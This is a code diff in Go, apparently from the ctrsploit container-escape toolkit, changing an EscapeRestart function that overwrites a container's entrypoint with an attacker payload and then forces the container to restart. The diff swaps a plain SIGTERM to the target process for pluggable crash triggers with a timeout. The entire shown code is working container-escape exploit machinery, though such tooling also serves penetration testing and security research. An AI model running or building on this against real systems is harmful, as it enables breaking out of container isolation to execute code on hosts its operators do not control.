@@ -1,16 +1,17 @@
 package pipeprimitive
 
 import (
+	"context"
 	"fmt"
 	"os"
-	"syscall"
 	"time"
 
+	"github.com/ctrsploit/ctrsploit/pkg/crash"
 	"github.com/ctrsploit/sploit-spec/pkg/log"
 )
 
 type restartMaterialPaths struct {
-	loaders   []string
+	loaders []string
 }
 
 var restartPaths = restartMaterialPaths{
@@ -20,10 +21,7 @@ var restartPaths = restartMaterialPaths{
 	},
 }
 
-func EscapeRestart(primitive Primitive, pid int, payload []byte, timeout time.Duration) error {
-	if pid <= 0 {
-		pid = 1
-	}
+func EscapeRestart(primitive Primitive, pid int, payload []byte, timeout time.Duration, methods ...string) error {
 	if err := WriteRestartMaterial(primitive, payload); err != nil {
 		return err
 	}
@@ -32,14 +30,33 @@ func EscapeRestart(primitive Primitive, pid int, payload []byte, timeout time.Du
 		return err
 	}
 	log.Logger.Info("Overwritten container entrypoint successfully")
-	log.Logger.Info("Triggering container restart ...")
-	time.Sleep(time.Second)
-	_ = syscall.Kill(pid, syscall.SIGTERM)
-	return nil
+	triggers, err := crash.NewTriggers(methods, crash.Options{
+		PID:   pid,
+		Delay: time.Second,
+	})
+	if err != nil {
+		return err
+	}
+	log.Logger.Infof("Triggering container restart with methods: %v", triggerNames(triggers))
+	ctx := context.Background()
+	if timeout > 0 {
+		var cancel context.CancelFunc
+		ctx, cancel = context.WithTimeout(ctx, timeout)
+		defer cancel()
+	}
+	return crash.TriggerFirst(ctx, triggers...)
 }
 
 func WriteRestartMaterial(primitive Primitive, payload []byte) error {
 	return writeRestartMaterial(primitive, payload, restartPaths)
+}
+
+func triggerNames(triggers []crash.Trigger) []string {
+	names := make([]string, 0, len(triggers))
+	for _, trigger := range triggers {
+		names = append(names, trigger.Name())
+	}
+	return names
 }
 
 func writeRestartMaterial(primitive Primitive, payload []byte, paths restartMaterialPaths) error {
